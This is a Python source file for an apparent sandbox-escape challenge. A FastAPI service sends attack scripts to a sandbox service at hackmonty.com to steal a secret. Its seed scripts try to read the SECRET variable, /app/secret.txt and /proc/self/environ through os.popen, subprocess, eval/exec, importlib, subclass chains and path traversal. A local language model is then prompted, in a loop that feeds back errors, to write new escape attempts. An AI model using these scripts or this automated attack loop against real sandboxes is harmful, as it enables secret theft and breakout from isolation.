import json
import asyncio

import httpx
import torch
from fastapi import FastAPI
from pydantic import BaseModel
from transformers import AutoModelForCausalLM, AutoTokenizer

MODEL_NAME = "Qwen/Qwen2.5-Coder-3B-Instruct"
HACKMONTY_URL = "https://hackmonty.com/run/"
MAX_LLM_ATTEMPTS = 8

app = FastAPI()

tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
model = AutoModelForCausalLM.from_pretrained(
    MODEL_NAME,
    torch_dtype=torch.float16,
    device_map="auto",
)

# ---------------------------------------------------------------------------
# Seed escape attempts – ordered from most likely to least likely to succeed.
# Each script must print the secret to stdout if successful.
# Monty limitations to keep in mind:
#   - os.environ / os.getenv return a FAKE env (no real SECRET there)
#   - No class definitions, no context managers, no match, no generators
#   - Available stdlib: sys, os, typing, asyncio, re, datetime, json
# ---------------------------------------------------------------------------
SEED_SCRIPTS: list[str] = [
    # --- Process execution ---
    """\
import os
out = os.popen('printenv SECRET').read()
if out.strip():
    print("SECRET=" + out.strip())
out2 = os.popen('cat /app/secret.txt').read()
if out2.strip():
    print("FILE=" + out2.strip())
""",
    """\
import os
os.system('printenv SECRET')
os.system('cat /app/secret.txt')
""",
    # --- Direct fd-level file I/O (bypasses path mount check?) ---
    """\
import os
try:
    fd = os.open('/app/secret.txt', os.O_RDONLY)
    data = os.read(fd, 4096)
    os.close(fd)
    print(data.decode())
except Exception as e:
    print('fd_open:', e)
""",
    # --- /proc/self/environ (real env, not Monty's fake one) ---
    """\
import os
try:
    fd = os.open('/proc/self/environ', os.O_RDONLY)
    data = os.read(fd, 65536)
    os.close(fd)
    for entry in data.split(b'\\x00'):
        if b'SECRET' in entry or b'secret' in entry:
            print(entry.decode(errors='replace'))
except Exception as e:
    print('proc_env:', e)
""",
    # --- subprocess via __import__ ---
    """\
try:
    sp = __import__('subprocess')
    r = sp.run(['cat', '/app/secret.txt'], capture_output=True, text=True, timeout=5)
    print(r.stdout)
    r2 = sp.run(['printenv', 'SECRET'], capture_output=True, text=True, timeout=5)
    print(r2.stdout)
except Exception as e:
    print('subprocess:', e)
""",
    # --- asyncio subprocess ---
    """\
import asyncio

async def run():
    try:
        proc = await asyncio.create_subprocess_exec(
            'cat', '/app/secret.txt',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        out, err = await proc.communicate()
        print(out.decode())
    except Exception as e:
        print('asyncio_sub:', e)

asyncio.run(run())
""",
    # --- Classic CPython subclass chain (may not work in Monty but worth trying) ---
    """\
try:
    subs = object.__subclasses__()
    for c in subs:
        n = getattr(c, '__name__', '')
        if 'popen' in n.lower() or 'Popen' in n:
            print('found:', c)
            obj = c(['cat', '/app/secret.txt'], stdout=-1)
            out, _ = obj.communicate()
            print(out)
except Exception as e:
    print('subclasses:', e)
""",
    # --- eval to import subprocess ---
    """\
try:
    result = eval("__import__('subprocess').run(['cat','/app/secret.txt'],capture_output=True,text=True).stdout")
    print(result)
except Exception as e:
    print('eval_sub:', e)
try:
    result2 = eval("__import__('os').popen('printenv SECRET').read()")
    print(result2)
except Exception as e2:
    print('eval_popen:', e2)
""",
    # --- exec ---
    """\
try:
    exec("import subprocess; print(subprocess.run(['cat','/app/secret.txt'],capture_output=True,text=True).stdout)")
except Exception as e:
    print('exec:', e)
try:
    exec("import os; print(os.popen('printenv SECRET').read())")
except Exception as e:
    print('exec_popen:', e)
""",
    # --- Importlib ---
    """\
try:
    import importlib
    subprocess = importlib.import_module('subprocess')
    print(subprocess.run(['cat', '/app/secret.txt'], capture_output=True, text=True).stdout)
except Exception as e:
    print('importlib:', e)
""",
    # --- sys.modules manipulation ---
    """\
import sys
try:
    print('modules:', list(sys.modules.keys())[:30])
    print('path:', sys.path)
    print('exec:', sys.executable)
    print('version:', sys.version)
except Exception as e:
    print('sys:', e)
try:
    if 'subprocess' in sys.modules:
        sp = sys.modules['subprocess']
        print(sp.run(['cat', '/app/secret.txt'], capture_output=True, text=True).stdout)
except Exception as e:
    print('sys_modules_sp:', e)
""",
    # --- Path traversal in file open ---
    """\
import os
for path in [
    '/app/secret.txt',
    '../app/secret.txt',
    '../../app/secret.txt',
    '/proc/self/environ',
    '/proc/1/environ',
    '/etc/environment',
    '/run/secrets/SECRET',
    '/run/secrets/secret',
]:
    try:
        fd = os.open(path, os.O_RDONLY)
        data = os.read(fd, 4096)
        os.close(fd)
        print(f'[{path}]:', data[:500])
    except Exception as e:
        print(f'[{path}]: {e}')
""",
    # --- os.listdir to enumerate filesystem ---
    """\
import os
for d in ['/', '/app', '/proc/self', '/run', '/run/secrets', '/etc']:
    try:
        print(f'ls {d}:', os.listdir(d))
    except Exception as e:
        print(f'ls {d}: {e}')
""",
    # --- format-string introspection ---
    """\
try:
    x = ''
    bases = '{0.__class__.__bases__}'.format(x)
    print('bases:', bases)
    subs = eval('{0.__class__.__bases__[0].__subclasses__}'.format(x) + '()')
    for c in subs:
        if any(k in str(c) for k in ['popen', 'Popen', 'wrap_close']):
            print('found subclass:', c)
except Exception as e:
    print('fmt:', e)
""",
    # --- Exception traceback leakage ---
    """\
import sys, traceback
try:
    raise RuntimeError('probe')
except Exception:
    print(traceback.format_exc())
    print(sys.exc_info())
# Look at __file__ attributes for path leakage
import os
print(getattr(os, '__file__', 'no file attr'))
print(getattr(sys, '__file__', 'no file attr'))
""",
    # --- globals / builtins inspection ---
    """\
g = globals()
print('globals keys:', list(g.keys()))
b = g.get('__builtins__', {})
if hasattr(b, '__dict__'):
    print('builtins:', list(b.__dict__.keys())[:40])
elif isinstance(b, dict):
    print('builtins dict:', list(b.keys())[:40])
try:
    import builtins
    print('builtins module:', dir(builtins))
except Exception as e:
    print('builtins import:', e)
""",
]

# ---------------------------------------------------------------------------
# LLM helpers
# ---------------------------------------------------------------------------
_SYSTEM_PROMPT = """\
You are a security researcher testing Pydantic's Monty Python sandbox.

Monty facts:
- Written in Rust, minimal Python interpreter
- Available stdlib: sys, os, typing, asyncio, re, datetime, json
- os.environ and os.getenv return a FAKE environment (SECRET not there)
- No class definitions, no context managers (no `with`), no match statements, no generators
- Functions ARE supported
- The goal: print the value of the SECRET env var or the contents of /app/secret.txt

IMPORTANT – do NOT use these (already tried, blocked by fake-env):
  os.environ, os.getenv, os.environ.get

DO try:
  os.popen, os.system, os.open+os.read, subprocess, asyncio subprocess,
  /proc/self/environ (fd-level), __import__, eval/exec, object.__subclasses__(),
  importlib, sys.modules injection, path traversal, /proc/1/environ

Output ONLY valid Python code. No markdown fences, no explanations.
"""


def _strip_fence(text: str) -> str:
    text = text.strip()
    for prefix in ("```python", "```"):
        if text.startswith(prefix):
            text = text[len(prefix):].lstrip("\n")
            break
    if text.endswith("```"):
        text = text[:-3].rstrip()
    return text.strip()


@torch.inference_mode()
def _llm_generate(history: list[dict]) -> str:
    ctx = ""
    if history:
        ctx = "\n\nRecent attempts + Monty responses (learn from errors):\n"
        for h in history[-4:]:
            ctx += f"\n--- Code ---\n{h['code'][:300]}\n--- Response ---\n{h['resp'][:400]}\n"

    messages = [
        {"role": "system", "content": _SYSTEM_PROMPT},
        {"role": "user", "content": f"Generate a NEW escape attempt that avoids the mistakes above.{ctx}"},
    ]
    text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
    inputs = tokenizer(text, return_tensors="pt").to(model.device)
    out = model.generate(
        **inputs,
        max_new_tokens=512,
        do_sample=True,
        temperature=0.9,
        top_p=0.95,
        pad_token_id=tokenizer.eos_token_id,
    )
    raw = tokenizer.decode(out[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
    return _strip_fence(raw)


# ---------------------------------------------------------------------------
# hackmonty.com API client
# ---------------------------------------------------------------------------
async def _run_on_monty(code: str, client: httpx.AsyncClient) -> dict:
    """POST code to hackmonty.com/run/ and return parsed response."""
    headers = {"Content-Type": "text/plain"}
    try:
        resp = await client.post(HACKMONTY_URL, content=code.encode(), headers=headers, timeout=30.0)
        try:
            return resp.json()
        except Exception:
            return {"raw": resp.text, "status": resp.status_code}
    except Exception as exc:
        return {"error": str(exc)}


def _has_secret(data: dict) -> tuple[bool, str]:
    """Return (True, evidence) if the response contains something that looks like a secret."""
    blob = json.dumps(data)
    # The server intercepts os.environ, so non-empty stdout that isn't an error is interesting
    stdout = data.get("stdout", "") or data.get("output", "") or data.get("raw", "")
    if not stdout:
        return False, ""
    # Exclude empty / pure-error responses
    lower = stdout.lower()
    noise = {"none", "", "err", "error"}
    if stdout.strip().lower() in noise:
        return False, ""
    # Positive signals
    if any(k in blob for k in ["/app/secret", "SECRET=", "flag{", "hackm"]):
        return True, stdout
    # Any non-trivial non-error stdout could be the secret
    if len(stdout.strip()) > 4 and "Traceback" not in stdout and "Error" not in stdout:
        return True, stdout
    return False, ""


# ---------------------------------------------------------------------------
# FastAPI
# ---------------------------------------------------------------------------
class ChatRequest(BaseModel):
    message: str
    tables: dict


class ChatResponse(BaseModel):
    response: str


@app.get("/")
def health():
    return {"status": "ok"}


@app.post("/chat", response_model=ChatResponse)
async def chat(payload: ChatRequest) -> ChatResponse:
    history: list[dict] = []
    found_secret: str | None = None
    winning_code: str | None = None

    async with httpx.AsyncClient() as client:
        # Phase 1: fire every seed script
        for code in SEED_SCRIPTS:
            result = await _run_on_monty(code, client)
            ok, evidence = _has_secret(result)
            if ok:
                found_secret = evidence
                winning_code = code
                break
            history.append({"code": code, "resp": json.dumps(result)[:500]})

        # Phase 2: LLM-driven attempts if seeds missed
        if not found_secret:
            for _ in range(MAX_LLM_ATTEMPTS):
                code = _llm_generate(history)
                if not code.strip():
                    continue
                result = await _run_on_monty(code, client)
                ok, evidence = _has_secret(result)
                if ok:
                    found_secret = evidence
                    winning_code = code
                    break
                history.append({"code": code, "resp": json.dumps(result)[:500]})

    if found_secret:
        return ChatResponse(
            response=json.dumps({
                "status": "SUCCESS",
                "secret": found_secret,
                "winning_code": winning_code,
            })
        )

    # Return full attempt log so the caller can analyse what Monty revealed
    return ChatResponse(
        response=json.dumps({
            "status": "not_found",
            "attempts": len(history),
            "log": [
                {"code": h["code"][:200], "resp": h["resp"][:300]}
                for h in history
            ],
        })
    )
